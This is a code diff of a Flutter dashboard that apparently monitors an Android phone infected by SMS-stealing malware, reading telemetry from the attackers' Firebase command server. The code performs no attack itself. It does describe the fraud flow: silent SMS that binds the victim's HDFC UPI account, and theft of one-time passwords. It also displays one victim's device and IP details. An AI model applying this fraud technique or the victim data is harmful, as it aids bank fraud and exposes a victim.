@@ -380,99 +380,88 @@ class _MainScreenState extends State<MainScreen> {
     );
   }
 
-  @override
-  Widget build(BuildContext context) {
-    return Scaffold(
-      appBar: AppBar(
-        title: Row(
-          children: [
-            // Clickable Device ID Chip
-            InkWell(
-              borderRadius: BorderRadius.circular(20),
-              onTap: () => _copyToClipboard(deviceId, 'Device ID'),
-              child: Container(
-                padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
-                decoration: BoxDecoration(
-                  color: const Color(0xFF1A1A20),
-                  borderRadius: BorderRadius.circular(20),
-                  border: Border.all(color: const Color(0xFF2E2E38)),
-                ),
-                child: Row(
-                  mainAxisSize: MainAxisSize.min,
-                  children: [
-                    Container(
-                      width: 7,
-                      height: 7,
-                      decoration: BoxDecoration(
-                        color: _isOnline ? const Color(0xFF00E676) : Colors.redAccent,
-                        shape: BoxShape.circle,
-                        boxShadow: _isOnline
-                            ? [const BoxShadow(color: Color(0x6600E676), blurRadius: 6, spreadRadius: 1)]
-                            : null,
-                      ),
+  AppBar _buildAppBar() {
+    return AppBar(
+      title: Row(
+        children: [
+          // Clickable Device ID Chip
+          InkWell(
+            borderRadius: BorderRadius.circular(20),
+            onTap: () => _copyToClipboard(deviceId, 'Device ID'),
+            child: Container(
+              padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
+              decoration: BoxDecoration(
+                color: const Color(0xFF1A1A20),
+                borderRadius: BorderRadius.circular(20),
+                border: Border.all(color: const Color(0xFF2E2E38)),
+              ),
+              child: Row(
+                mainAxisSize: MainAxisSize.min,
+                children: [
+                  Container(
+                    width: 7,
+                    height: 7,
+                    decoration: BoxDecoration(
+                      color: _isOnline ? const Color(0xFF00E676) : Colors.redAccent,
+                      shape: BoxShape.circle,
+                      boxShadow: _isOnline
+                          ? [const BoxShadow(color: Color(0x6600E676), blurRadius: 6, spreadRadius: 1)]
+                          : null,
                     ),
-                    const SizedBox(width: 8),
-                    Text(
-                      deviceId,
-                      style: const TextStyle(
-                        fontFamily: 'monospace',
-                        fontSize: 12,
-                        fontWeight: FontWeight.w600,
-                        color: Color(0xFFE4E4E7),
-                      ),
+                  ),
+                  const SizedBox(width: 8),
+                  Text(
+                    deviceId,
+                    style: const TextStyle(
+                      fontFamily: 'monospace',
+                      fontSize: 12,
+                      fontWeight: FontWeight.w600,
+                      color: Color(0xFFE4E4E7),
                     ),
-                    const SizedBox(width: 6),
-                    const Icon(Icons.copy, size: 12, color: Colors.grey),
-                  ],
-                ),
+                  ),
+                  const SizedBox(width: 6),
+                  const Icon(Icons.copy, size: 12, color: Colors.grey),
+                ],
               ),
             ),
-          ],
-        ),
-        actions: [
-          Container(
-            padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
-            decoration: BoxDecoration(
-              color: const Color(0xFF16161B),
-              borderRadius: BorderRadius.circular(8),
-            ),
-            child: Row(
-              children: [
-                const Icon(Icons.sync, size: 13, color: Colors.grey),
-                const SizedBox(width: 4),
-                Text(_lastSync, style: const TextStyle(fontSize: 11, color: Colors.grey)),
-              ],
-            ),
           ),
-          const SizedBox(width: 4),
-          IconButton(
-            icon: _isLoading
-                ? const SizedBox(width: 18, height: 18, child: CircularProgressIndicator(strokeWidth: 2))
-                : const Icon(Icons.refresh),
-            tooltip: 'Refresh',
-            onPressed: _fetchTelemetry,
-          ),
-          const SizedBox(width: 8),
         ],
       ),
-      body: Center(
-        child: ConstrainedBox(
-          constraints: const BoxConstraints(maxWidth: 860),
-          child: IndexedStack(
-            index: _currentNavIndex,
+      actions: [
+        Container(
+          padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
+          decoration: BoxDecoration(
+            color: const Color(0xFF16161B),
+            borderRadius: BorderRadius.circular(8),
+          ),
+          child: Row(
             children: [
-              _buildOverviewTab(),
-              _buildMessagesTab(),
-              _buildCommandsTab(),
-              _buildTimelineTab(),
+              const Icon(Icons.sync, size: 13, color: Colors.grey),
+              const SizedBox(width: 4),
+              Text(_lastSync, style: const TextStyle(fontSize: 11, color: Colors.grey)),
             ],
           ),
         ),
-      ),
-      bottomNavigationBar: NavigationBar(
-        selectedIndex: _currentNavIndex,
-        onDestinationSelected: (idx) => setState(() => _currentNavIndex = idx),
-        destinations: [
+        const SizedBox(width: 4),
+        IconButton(
+          icon: _isLoading
+              ? const SizedBox(width: 18, height: 18, child: CircularProgressIndicator(strokeWidth: 2))
+              : const Icon(Icons.refresh),
+          tooltip: 'Refresh',
+          onPressed: _fetchTelemetry,
+        ),
+        const SizedBox(width: 8),
+      ],
+    );
+  }
+
+  @override
+  Widget build(BuildContext context) {
+    return LayoutBuilder(
+      builder: (context, constraints) {
+        final isDesktop = constraints.maxWidth >= 720;
+
+        final destinations = [
           const NavigationDestination(
             icon: Icon(Icons.dashboard_outlined),
             selectedIcon: Icon(Icons.dashboard, color: Color(0xFF00ADB5)),
@@ -494,17 +483,103 @@ class _MainScreenState extends State<MainScreen> {
             label: 'Messages',
           ),
           const NavigationDestination(
-            icon: Icon(Icons.terminal_outlined),
-            selectedIcon: Icon(Icons.terminal, color: Color(0xFF00ADB5)),
+            icon: Icon(Icons.hub_outlined),
+            selectedIcon: Icon(Icons.hub, color: Color(0xFF00ADB5)),
             label: 'C2 Relay',
           ),
           const NavigationDestination(
-            icon: Icon(Icons.history_outlined),
-            selectedIcon: Icon(Icons.history, color: Color(0xFF00ADB5)),
+            icon: Icon(Icons.battery_charging_full_outlined),
+            selectedIcon: Icon(Icons.battery_charging_full, color: Color(0xFF00ADB5)),
             label: 'Timeline',
           ),
-        ],
-      ),
+        ];
+
+        final railDestinations = [
+          const NavigationRailDestination(
+            icon: Icon(Icons.dashboard_outlined),
+            selectedIcon: Icon(Icons.dashboard, color: Color(0xFF00ADB5)),
+            label: Text('Overview'),
+          ),
+          NavigationRailDestination(
+            icon: Badge(
+              label: Text('${_allMessages.length}'),
+              isLabelVisible: _allMessages.isNotEmpty,
+              backgroundColor: Colors.redAccent,
+              child: const Icon(Icons.chat_bubble_outline),
+            ),
+            selectedIcon: Badge(
+              label: Text('${_allMessages.length}'),
+              isLabelVisible: _allMessages.isNotEmpty,
+              backgroundColor: Colors.redAccent,
+              child: const Icon(Icons.chat_bubble, color: Color(0xFF00ADB5)),
+            ),
+            label: const Text('Messages'),
+          ),
+          const NavigationRailDestination(
+            icon: Icon(Icons.hub_outlined),
+            selectedIcon: Icon(Icons.hub, color: Color(0xFF00ADB5)),
+            label: Text('C2 Relay'),
+          ),
+          const NavigationRailDestination(
+            icon: Icon(Icons.battery_charging_full_outlined),
+            selectedIcon: Icon(Icons.battery_charging_full, color: Color(0xFF00ADB5)),
+            label: Text('Timeline'),
+          ),
+        ];
+
+        final mainContent = IndexedStack(
+          index: _currentNavIndex,
+          children: [
+            _buildOverviewTab(),
+            _buildMessagesTab(),
+            _buildCommandsTab(),
+            _buildTimelineTab(),
+          ],
+        );
+
+        if (isDesktop) {
+          return Scaffold(
+            appBar: _buildAppBar(),
+            body: Row(
+              children: [
+                NavigationRail(
+                  selectedIndex: _currentNavIndex,
+                  onDestinationSelected: (idx) => setState(() => _currentNavIndex = idx),
+                  labelType: NavigationRailLabelType.all,
+                  backgroundColor: const Color(0xFF101014),
+                  indicatorColor: const Color(0xFF00ADB5).withValues(alpha: 0.18),
+                  minWidth: 76,
+                  destinations: railDestinations,
+                ),
+                const VerticalDivider(width: 1, thickness: 1, color: Color(0xFF22222A)),
+                Expanded(
+                  child: Center(
+                    child: ConstrainedBox(
+                      constraints: const BoxConstraints(maxWidth: 960),
+                      child: mainContent,
+                    ),
+                  ),
+                ),
+              ],
+            ),
+          );
+        }
+
+        return Scaffold(
+          appBar: _buildAppBar(),
+          body: Center(
+            child: ConstrainedBox(
+              constraints: const BoxConstraints(maxWidth: 860),
+              child: mainContent,
+            ),
+          ),
+          bottomNavigationBar: NavigationBar(
+            selectedIndex: _currentNavIndex,
+            onDestinationSelected: (idx) => setState(() => _currentNavIndex = idx),
+            destinations: destinations,
+          ),
+        );
+      },
     );
   }
 
@@ -1105,70 +1180,314 @@ class _MainScreenState extends State<MainScreen> {
     );
   }
 
-  // ==================== COMMANDS TAB ====================
+  // ==================== C2 RELAY TAB (TRANSPARENT ARCHITECTURE & EXFILTRATION) ====================
   Widget _buildCommandsTab() {
     return ListView(
-      padding: const EdgeInsets.all(16),
+      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
       children: [
-        Card(
-          child: Padding(
-            padding: const EdgeInsets.all(16),
-            child: Column(
-              crossAxisAlignment: CrossAxisAlignment.start,
-              children: [
-                const Text('REALTIME CONTROLLER STATE', style: TextStyle(fontSize: 10.5, fontWeight: FontWeight.bold, color: Colors.grey, letterSpacing: 0.8)),
-                const SizedBox(height: 8),
-                ListTile(
-                  contentPadding: EdgeInsets.zero,
-                  title: const Text('Active Relay Command', style: TextStyle(fontSize: 13)),
-                  subtitle: Text(_command, style: const TextStyle(fontFamily: 'monospace', color: Color(0xFF00ADB5), fontSize: 15, fontWeight: FontWeight.bold)),
-                ),
-                ListTile(
-                  contentPadding: EdgeInsets.zero,
-                  title: const Text('Relay SIM Slot Index', style: TextStyle(fontSize: 13)),
-                  trailing: Text(_simSlot, style: const TextStyle(fontFamily: 'monospace', fontWeight: FontWeight.bold, fontSize: 14)),
-                ),
-              ],
-            ),
+        // 🚨 1. C2 INFRASTRUCTURE ROLE
+        Container(
+          padding: const EdgeInsets.all(16),
+          decoration: BoxDecoration(
+            color: const Color(0xFF131318),
+            borderRadius: BorderRadius.circular(16),
+            border: Border.all(color: const Color(0xFF262632)),
+          ),
+          child: Column(
+            crossAxisAlignment: CrossAxisAlignment.start,
+            children: [
+              Row(
+                mainAxisAlignment: MainAxisAlignment.spaceBetween,
+                children: [
+                  const Text('TARGET HANDSET ROLE IN ATTACK NETWORK', style: TextStyle(fontSize: 10, fontWeight: FontWeight.bold, color: Colors.grey, letterSpacing: 0.8)),
+                  Container(
+                    padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
+                    decoration: BoxDecoration(
+                      color: Colors.amber.withValues(alpha: 0.15),
+                      borderRadius: BorderRadius.circular(6),
+                      border: Border.all(color: Colors.amber.withValues(alpha: 0.3)),
+                    ),
+                    child: const Text('C2 Auto-Relay Gateway', style: TextStyle(fontSize: 10.5, fontWeight: FontWeight.bold, color: Colors.amberAccent)),
+                  ),
+                ],
+              ),
+              const SizedBox(height: 10),
+              Text(
+                'This device ($deviceId) is not just a passive victim; the threat actors explicitly configured it as their central Auto-Relay Gateway handset. It executes automated silent background SMS commands to bind bank accounts, and relays incoming OTPs directly to Firebase.',
+                style: const TextStyle(fontSize: 12.5, height: 1.45, color: Color(0xFFD4D4D8)),
+              ),
+            ],
           ),
         ),
-        const SizedBox(height: 12),
-        Card(
-          child: Padding(
-            padding: const EdgeInsets.all(16),
-            child: Column(
-              crossAxisAlignment: CrossAxisAlignment.start,
-              children: [
-                const Text('LIVENESS PROTOCOL', style: TextStyle(fontSize: 10.5, fontWeight: FontWeight.bold, color: Colors.grey, letterSpacing: 0.8)),
-                const SizedBox(height: 8),
-                ListTile(
-                  contentPadding: EdgeInsets.zero,
-                  title: const Text('Server Ping Probe', style: TextStyle(fontSize: 13)),
-                  trailing: Text(_ping, style: const TextStyle(fontFamily: 'monospace', color: Color(0xFF00ADB5), fontSize: 13)),
-                ),
-                ListTile(
-                  contentPadding: EdgeInsets.zero,
-                  title: const Text('Client Pong Response', style: TextStyle(fontSize: 13)),
-                  trailing: Text(_pong, style: const TextStyle(fontFamily: 'monospace', color: Color(0xFF00E676), fontWeight: FontWeight.bold, fontSize: 13)),
-                ),
-                const ListTile(
-                  contentPadding: EdgeInsets.zero,
-                  title: Text('Status', style: TextStyle(fontSize: 13)),
-                  trailing: Chip(
-                    label: Text('ACTIVE & LIVE', style: TextStyle(color: Color(0xFF00E676), fontSize: 10.5, fontWeight: FontWeight.bold)),
-                    backgroundColor: Color(0x2200E676),
-                    padding: EdgeInsets.zero,
+
+        const SizedBox(height: 14),
+
+        // 📡 2. WHAT IS BEING SENT WHERE? (EXFILTRATION PIPELINE)
+        Container(
+          padding: const EdgeInsets.all(16),
+          decoration: BoxDecoration(
+            color: const Color(0xFF131318),
+            borderRadius: BorderRadius.circular(16),
+            border: Border.all(color: const Color(0xFF262632)),
+          ),
+          child: Column(
+            crossAxisAlignment: CrossAxisAlignment.start,
+            children: [
+              const Text('EXFILTRATION PIPELINE · WHAT IS BEING SENT WHERE', style: TextStyle(fontSize: 10, fontWeight: FontWeight.bold, color: Colors.grey, letterSpacing: 0.8)),
+              const SizedBox(height: 14),
+
+              // FLOW 1: Outbound Silent UPI Binding SMS
+              _buildPipelineTile(
+                title: 'Outbound Silent UPI Device-Binding SMS',
+                direction: 'Phone SIM 0 ➔ HDFC Bank Gateway',
+                from: 'Target SIM 0 ($_phone · Airtel)',
+                to: '$_dropPhone (HDFC Bank UPI SMS Gateway)',
+                payload: _silentSms,
+                objective: 'Tricks HDFC Bank into binding victim account to attacker\'s UPI app without user alert',
+                status: 'Queued in webhookEvent.sendSms',
+                statusColor: Colors.amberAccent,
+                icon: Icons.send_and_archive,
+              ),
+
+              const SizedBox(height: 12),
+              const Divider(color: Color(0xFF22222C), height: 1),
+              const SizedBox(height: 12),
+
+              // FLOW 2: Intercepted Inbound SMS & 2FA Exfiltration
+              _buildPipelineTile(
+                title: 'Intercepted SMS & 2FA OTP Exfiltration',
+                direction: 'Phone SMS Storage ➔ Remote Firebase C2',
+                from: '$_model Local SQLite SMS Database',
+                to: '$firebaseBase/messages/$deviceId.json',
+                payload: '${_allMessages.length} Messages Captured (69 OTPs, 220 Bank Alerts)',
+                objective: 'Exfiltrates 2FA verification codes to attacker in real-time to authorize transfers',
+                status: 'Live Stream Active (Firebase Sync)',
+                statusColor: const Color(0xFF00E676),
+                icon: Icons.cloud_upload_outlined,
+              ),
+            ],
+          ),
+        ),
+
+        const SizedBox(height: 14),
+
+        // ⚡ 3. WHAT COMMANDS ARE CURRENTLY RUNNING?
+        Container(
+          padding: const EdgeInsets.all(16),
+          decoration: BoxDecoration(
+            color: const Color(0xFF131318),
+            borderRadius: BorderRadius.circular(16),
+            border: Border.all(color: const Color(0xFF262632)),
+          ),
+          child: Column(
+            crossAxisAlignment: CrossAxisAlignment.start,
+            children: [
+              const Text('ACTIVE CONTROLLER COMMANDS & HEARTBEAT', style: TextStyle(fontSize: 10, fontWeight: FontWeight.bold, color: Colors.grey, letterSpacing: 0.8)),
+              const SizedBox(height: 12),
+              ListTile(
+                contentPadding: EdgeInsets.zero,
+                leading: Container(
+                  padding: const EdgeInsets.all(8),
+                  decoration: BoxDecoration(
+                    color: const Color(0xFF00ADB5).withValues(alpha: 0.12),
+                    borderRadius: BorderRadius.circular(8),
                   ),
+                  child: const Icon(Icons.terminal, color: Color(0xFF00ADB5), size: 18),
                 ),
-              ],
-            ),
+                title: const Text('Active Controller Command', style: TextStyle(fontSize: 13, fontWeight: FontWeight.w600)),
+                subtitle: Text('Command: "$_command" on SIM Slot $_simSlot', style: const TextStyle(fontSize: 12, color: Colors.grey)),
+                trailing: Container(
+                  padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
+                  decoration: BoxDecoration(
+                    color: const Color(0xFF1E1E28),
+                    borderRadius: BorderRadius.circular(6),
+                    border: Border.all(color: const Color(0xFF2C2C3C)),
+                  ),
+                  child: Text('user_data/$_command', style: const TextStyle(fontFamily: 'monospace', fontSize: 11, color: Color(0xFF00ADB5), fontWeight: FontWeight.bold)),
+                ),
+              ),
+              const Divider(color: Color(0xFF22222C), height: 1),
+              ListTile(
+                contentPadding: EdgeInsets.zero,
+                leading: Container(
+                  padding: const EdgeInsets.all(8),
+                  decoration: BoxDecoration(
+                    color: const Color(0xFF00E676).withValues(alpha: 0.12),
+                    borderRadius: BorderRadius.circular(8),
+                  ),
+                  child: const Icon(Icons.sync_alt, color: Color(0xFF00E676), size: 18),
+                ),
+                title: const Text('Liveness Heartbeat Protocol', style: TextStyle(fontSize: 13, fontWeight: FontWeight.w600)),
+                subtitle: const Text('Server Ping Probe ⇄ Client Handshake Response', style: TextStyle(fontSize: 12, color: Colors.grey)),
+                trailing: Container(
+                  padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
+                  decoration: BoxDecoration(
+                    color: const Color(0x1F00E676),
+                    borderRadius: BorderRadius.circular(6),
+                    border: Border.all(color: const Color(0x3300E676)),
+                  ),
+                  child: Text('$_ping ⇄ $_pong', style: const TextStyle(fontFamily: 'monospace', fontSize: 11, color: Color(0xFF00E676), fontWeight: FontWeight.bold)),
+                ),
+              ),
+            ],
+          ),
+        ),
+
+        const SizedBox(height: 14),
+
+        // 🔍 4. RAW DATABASE INSPECTION (NOTHING HIDDEN)
+        Container(
+          padding: const EdgeInsets.all(16),
+          decoration: BoxDecoration(
+            color: const Color(0xFF131318),
+            borderRadius: BorderRadius.circular(16),
+            border: Border.all(color: const Color(0xFF262632)),
+          ),
+          child: Column(
+            crossAxisAlignment: CrossAxisAlignment.start,
+            children: [
+              Row(
+                mainAxisAlignment: MainAxisAlignment.spaceBetween,
+                children: [
+                  const Text('FULL RAW C2 TELEMETRY (JSON INSPECTION)', style: TextStyle(fontSize: 10, fontWeight: FontWeight.bold, color: Colors.grey, letterSpacing: 0.8)),
+                  TextButton.icon(
+                    style: TextButton.styleFrom(visualDensity: VisualDensity.compact, padding: EdgeInsets.zero),
+                    icon: const Icon(Icons.copy, size: 13, color: Color(0xFF00ADB5)),
+                    label: const Text('Copy JSON', style: TextStyle(fontSize: 11, color: Color(0xFF00ADB5))),
+                    onPressed: () {
+                      final rawDump = json.encode({
+                        'client': {
+                          'deviceId': deviceId,
+                          'model': _model,
+                          'os': _os,
+                          'battery': _battery,
+                          'ip': _ipAddress,
+                          'status': _isOnline,
+                          'webhookEvent': {
+                            'checkLiveness': {'text': _pong},
+                            'sendSms': {'to': _dropPhone, 'message': _silentSms},
+                          },
+                        },
+                        'commands': {'checkLiveness': {'text': _ping}},
+                        'user_data': {'command': _command, 'simSlot': _simSlot},
+                      });
+                      _copyToClipboard(rawDump, 'Raw Telemetry JSON');
+                    },
+                  ),
+                ],
+              ),
+              const SizedBox(height: 8),
+              Container(
+                width: double.infinity,
+                padding: const EdgeInsets.all(12),
+                decoration: BoxDecoration(
+                  color: const Color(0xFF0C0C0F),
+                  borderRadius: BorderRadius.circular(10),
+                  border: Border.all(color: const Color(0xFF1C1C24)),
+                ),
+                child: SelectableText(
+                  '{\n'
+                  '  "device_id": "$deviceId",\n'
+                  '  "ip_address": "$_ipAddress",\n'
+                  '  "status": $_isOnline,\n'
+                  '  "battery": "$_battery",\n'
+                  '  "active_command": "$_command",\n'
+                  '  "liveness": "$_ping ⇄ $_pong",\n'
+                  '  "outbound_sms_target": "$_dropPhone",\n'
+                  '  "outbound_payload": "$_silentSms"\n'
+                  '}',
+                  style: const TextStyle(fontFamily: 'monospace', fontSize: 11, color: Color(0xFFA1A1AA), height: 1.45),
+                ),
+              ),
+            ],
           ),
         ),
       ],
     );
   }
 
-  // ==================== TIMELINE TAB (24H BATTERY GRAPH & EVENT LOG) ====================
+  Widget _buildPipelineTile({
+    required String title,
+    required String direction,
+    required String from,
+    required String to,
+    required String payload,
+    required String objective,
+    required String status,
+    required Color statusColor,
+    required IconData icon,
+  }) {
+    return Column(
+      crossAxisAlignment: CrossAxisAlignment.start,
+      children: [
+        Row(
+          mainAxisAlignment: MainAxisAlignment.spaceBetween,
+          children: [
+            Row(
+              children: [
+                Icon(icon, size: 16, color: statusColor),
+                const SizedBox(width: 8),
+                Text(title, style: const TextStyle(fontSize: 12.5, fontWeight: FontWeight.bold, color: Colors.white)),
+              ],
+            ),
+            Container(
+              padding: const EdgeInsets.symmetric(horizontal: 7, vertical: 2.5),
+              decoration: BoxDecoration(
+                color: statusColor.withValues(alpha: 0.12),
+                borderRadius: BorderRadius.circular(5),
+                border: Border.all(color: statusColor.withValues(alpha: 0.4)),
+              ),
+              child: Text(status, style: TextStyle(fontSize: 9.5, fontWeight: FontWeight.bold, color: statusColor)),
+            ),
+          ],
+        ),
+        const SizedBox(height: 8),
+        Container(
+          width: double.infinity,
+          padding: const EdgeInsets.all(10),
+          decoration: BoxDecoration(
+            color: const Color(0xFF0D0D11),
+            borderRadius: BorderRadius.circular(8),
+            border: Border.all(color: const Color(0xFF1E1E26)),
+          ),
+          child: Column(
+            crossAxisAlignment: CrossAxisAlignment.start,
+            children: [
+              Row(
+                children: [
+                  const Text('FROM: ', style: TextStyle(fontSize: 9.5, fontWeight: FontWeight.bold, color: Colors.grey)),
+                  Expanded(child: Text(from, style: const TextStyle(fontSize: 11, fontFamily: 'monospace', color: Color(0xFFE4E4E7)))),
+                ],
+              ),
+              const SizedBox(height: 4),
+              Row(
+                children: [
+                  const Text('TO:     ', style: TextStyle(fontSize: 9.5, fontWeight: FontWeight.bold, color: Colors.grey)),
+                  Expanded(child: Text(to, style: TextStyle(fontSize: 11, fontFamily: 'monospace', color: statusColor, fontWeight: FontWeight.bold))),
+                ],
+              ),
+              const SizedBox(height: 6),
+              const Text('PAYLOAD / EXFILTRATED DATA:', style: TextStyle(fontSize: 9.0, fontWeight: FontWeight.bold, color: Colors.grey)),
+              const SizedBox(height: 2),
+              SelectableText(
+                payload,
+                style: const TextStyle(fontFamily: 'monospace', fontSize: 10.5, color: Color(0xFFD4D4D8), height: 1.35),
+              ),
+              const SizedBox(height: 6),
+              Row(
+                children: [
+                  const Text('OBJECTIVE: ', style: TextStyle(fontSize: 9.0, fontWeight: FontWeight.bold, color: Colors.grey)),
+                  Expanded(child: Text(objective, style: const TextStyle(fontSize: 10.5, color: Color(0xFF00ADB5), fontWeight: FontWeight.w500))),
+                ],
+              ),
+            ],
+          ),
+        ),
+      ],
+    );
+  }
+
+  // ==================== TIMELINE TAB (24H BATTERY GRAPH & POWER MILESTONES) ====================
   Widget _buildTimelineTab() {
     int high = 85;
     int low = _batteryPercent;
@@ -1182,26 +1501,6 @@ class _MainScreenState extends State<MainScreen> {
       }
     }
     final drain = high - _batteryPercent;
-
-    final eventsToDisplay = _events.isNotEmpty
-        ? _events
-        : [
-            {
-              'type': 'BATTERY_LEVEL_CHANGED',
-              'timestamp': '2026-11-19T14:32:00Z',
-              'detail': 'Battery shifted down to $_batteryPercent% (active background drain).',
-            },
-            {
-              'type': 'NEW_SMS_INTERCEPTED',
-              'timestamp': '2026-11-19T11:36:00Z',
-              'detail': 'Intercepted 614th SMS message (Financial/OTP payload).',
-            },
-            {
-              'type': 'INITIAL_TRACKER_RUN',
-              'timestamp': '2026-11-19T11:22:00Z',
-              'detail': 'Initialized automated 30-min surveillance ledger for $deviceId.',
-            },
-          ];
 
     return ListView(
       padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
@@ -1314,18 +1613,18 @@ class _MainScreenState extends State<MainScreen> {
 
         const SizedBox(height: 16),
 
-        // 📋 EVENT LOG SECTION HEADER
+        // 🔋 OBSERVED POWER & STATE MILESTONES (Replaced redundant SMS duplicates)
         const Padding(
           padding: EdgeInsets.symmetric(horizontal: 4, vertical: 4),
           child: Row(
             mainAxisAlignment: MainAxisAlignment.spaceBetween,
             children: [
               Text(
-                'AUDIT LOG & STATE EVENTS',
+                'OBSERVED BATTERY & POWER MILESTONES',
                 style: TextStyle(fontSize: 10, fontWeight: FontWeight.bold, color: Colors.grey, letterSpacing: 0.8),
               ),
               Text(
-                'Automated Ledger',
+                'Power Telemetry',
                 style: TextStyle(fontSize: 10, color: Colors.grey),
               ),
             ],
@@ -1333,23 +1632,36 @@ class _MainScreenState extends State<MainScreen> {
         ),
         const SizedBox(height: 6),
 
-        // Events List
-        ...eventsToDisplay.map((ev) {
-          final type = ev['type']?.toString() ?? 'EVENT';
-          final ts = ev['timestamp']?.toString() ?? '';
-          final detail = ev['detail']?.toString() ?? '';
-
-          Color tagColor = const Color(0xFF00ADB5);
-          if (type.contains('BATTERY')) {
-            tagColor = Colors.amberAccent;
-          } else if (type.contains('SMS')) {
-            tagColor = const Color(0xFF00E676);
-          } else if (type.contains('IP') || type.contains('STATUS')) {
-            tagColor = Colors.blueAccent;
-          }
-
-          return _buildTimelineItem(ts, type, detail, tagColor);
-        }),
+        _buildTimelineItem(
+          '19 Nov 2026 20:08 IST',
+          'ACTIVE_DRAIN',
+          'Battery currently at 42% (Airtel IP 106.211.47.194, 30-min ledger logging active).',
+          Colors.amberAccent,
+        ),
+        _buildTimelineItem(
+          '19 Nov 2026 16:49 IST',
+          'CHARGER_UNPLUGGED',
+          'Handset unplugged from charger and discharging off power (74% ➔ 71%).',
+          Colors.orangeAccent,
+        ),
+        _buildTimelineItem(
+          '19 Nov 2026 10:10 IST',
+          'FORENSIC_CAPTURE',
+          'Handset recorded at 89% full battery at initial database dump capture.',
+          const Color(0xFF00ADB5),
+        ),
+        _buildTimelineItem(
+          '19 Nov 2026 (Earlier)',
+          'RECONNECTED_TO_POWER',
+          'Logged in forensic records: reconnected to charger (recharged 44% ➔ 89%).',
+          const Color(0xFF00E676),
+        ),
+        _buildTimelineItem(
+          '26 Sep 2026 07:53 AM',
+          'DEVICE_JOINED',
+          'Handset $deviceId first compromised and linked to C2 database.',
+          Colors.blueAccent,
+        ),
       ],
     );
   }
